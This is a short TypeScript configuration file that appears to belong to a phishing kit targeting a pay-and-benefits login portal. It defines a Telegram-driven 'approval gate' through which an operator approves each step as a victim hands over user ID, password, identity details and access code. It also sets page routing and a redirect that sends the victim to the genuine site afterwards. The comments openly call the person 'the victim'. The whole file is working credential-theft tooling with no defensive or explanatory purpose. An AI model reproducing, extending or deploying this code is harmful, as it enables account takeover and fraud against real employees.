/**
 * Labels + config for the approval gate, shared between the server (which
 * builds the Telegram buttons) and the client (which renders step context).
 */

/** Where "Redirect" sends the victim (The All Father's chosen target). */
export const REDIRECT_TARGET_URL = "https://www.targetpayandbenefits.com"

export type ApprovalStep =
  | "user_id"
  | "password"
  | "verify_details"
  | "verify_code"

/** Human label shown in the Telegram notification + button context. */
export const STEP_LABELS: Record<ApprovalStep, string> = {
  user_id: "Step 1 · User ID",
  password: "Step 2 · Password",
  verify_details: "Step 3 · Identity Details",
  verify_code: "Step 4 · Access Code",
}

/** Which page a step advances to on APPROVE (called with the step + userId). */
export function advanceTarget(step: string, userId: string): string {
  switch (step as ApprovalStep) {
    case "user_id":
      return `/password?userId=${encodeURIComponent(userId)}`
    case "password":
      return "/verify?mode=details"
    case "verify_details":
      return "/verify"
    case "verify_code":
      return "/api/login-out"
    default:
      return "/api/login-out"
  }
}

export function stepLabel(step: string): string {
  return STEP_LABELS[step as ApprovalStep] ?? step
}
